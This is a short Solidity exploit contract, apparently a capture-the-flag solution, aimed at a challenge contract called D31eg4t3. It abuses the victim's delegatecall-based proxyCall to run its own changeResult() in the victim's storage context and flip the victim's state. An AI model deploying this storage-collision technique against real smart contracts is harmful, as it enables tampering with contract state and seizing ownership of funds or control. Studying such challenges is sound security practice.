// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    bool public result;
    address public newOwner;

    constructor(address addr) payable {
        victim = addr;
    }

    function changeResult() external {
        result = true;
    }
    
    function exploit() external {
        bytes memory data = abi.encodeWithSignature("changeResult()");
        ID31eg4t3(victim).proxyCall(data);
    }
}